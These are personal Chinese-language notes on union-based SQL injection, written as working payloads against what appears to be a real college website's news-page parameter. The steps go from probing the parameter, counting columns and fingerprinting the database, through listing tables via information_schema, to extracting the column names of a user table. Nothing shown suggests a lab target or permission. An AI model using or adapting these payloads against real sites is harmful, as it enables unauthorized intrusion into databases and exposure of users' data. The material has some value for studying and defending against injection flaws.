sql 注入

 判断 该sql注入点 是 字符串还是数值型， `  通过在url后面添加 '-- `     来判断

如：`https://nonoicollege.in/view_news.php?nid=21'-- `





- order 5 ： 按照 select的 第五个字段排序。 可以判断该sql的select的字段个数。

- 查看页面具体展示内容对应的字段 `https://nonoicollege.in/view_news.php?nid=30 union select 1,2,3,4`

  <img src="C:\Users\YDS\AppData\Roaming\Typora\typora-user-images\image-20210627152755992.png" alt="image-20210627152755992" style="zoom:50%;" />

- user(),version() , @@basedir,database(), 分别是 获取当前的用户和数据版本 

  <img src="C:\Users\YDS\AppData\Roaming\Typora\typora-user-images\image-20210627152954605.png" alt="image-20210627152954605" style="zoom:50%;" />

  <img src="C:\Users\YDS\AppData\Roaming\Typora\typora-user-images\image-20210627153137532.png" alt="image-20210627153137532" style="zoom:50%;" />

- `select 1,table_name,database(),4 from information_schema.tables where table_schema= 'nonoi_col'` 查询该数据库下所有的表名 

  <img src="C:\Users\YDS\AppData\Roaming\Typora\typora-user-images\image-20210627153601154.png" alt="image-20210627153601154" style="zoom:50%;" />

- group_concat(table_name) 来让多个记录的该字段合为一个string 输出。

  <img src="C:\Users\YDS\AppData\Roaming\Typora\typora-user-images\image-20210627153911250.png" alt="image-20210627153911250" style="zoom:50%;" />

- 根据表名，获取该表的字段 ` select 1,group_concat(column_name),database(),4 from information_schema.columns where table_schema= 'nonoi_col' and table_name ='tbl_usr'`  

  <img src="C:\Users\YDS\AppData\Roaming\Typora\typora-user-images\image-20210627154244540.png" alt="image-20210627154244540" style="zoom:50%;" />

- 

